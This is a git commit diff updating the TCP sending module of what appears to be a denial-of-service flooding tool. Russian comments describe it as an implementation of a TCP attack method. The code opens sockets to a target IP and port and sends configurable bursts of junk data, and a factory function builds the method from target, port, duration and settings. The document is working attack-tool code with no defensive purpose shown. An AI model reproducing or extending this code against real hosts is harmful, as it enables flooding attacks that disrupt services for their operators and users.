ec5b93f5cb47793871f65646c200c9b453ad451a
Black-by-Black <red201120112011@gmail.com>
2025-04-05 18:27:30 +0300

    Update tcp.py

--- sender/methods/tcp.py
+++ sender/methods/tcp.py
@@ -2,15 +2,24 @@ from sender.utils.network import create_tcp_socket
 from sender.methods.base_method import BaseMethod
 
 class TCPMethod(BaseMethod):
+    """Реализация TCP метода атаки"""
+    
     def send_packet(self):
-        sock = create_tcp_socket(self.target_ip, self.target_port)
+        sock = create_tcp_socket(self.target_ip, self.target_port, self.settings)
         if sock:
             try:
-                sock.send(b'X' * 1024)  # Отправляем 1KB данных
-            except:
-                pass
+                # Отправка данных
+                data = b'X' * self.settings.packet_size
+                sock.send(data)
+                
+                if self.settings.verbose:
+                    print(f"Отправлен TCP пакет на {self.target_ip}:{self.target_port}")
+            except Exception as e:
+                if self.settings.verbose:
+                    print(f"Ошибка при отправке TCP: {e}")
             finally:
                 sock.close()
 
-def tcp(target_ip, target_port, duration):
-    return TCPMethod(target_ip, target_port, duration)
+def tcp(target_ip, target_port, duration, settings):
+    """Фабрика для создания TCP метода"""
+    return TCPMethod(target_ip, target_port, duration, settings)
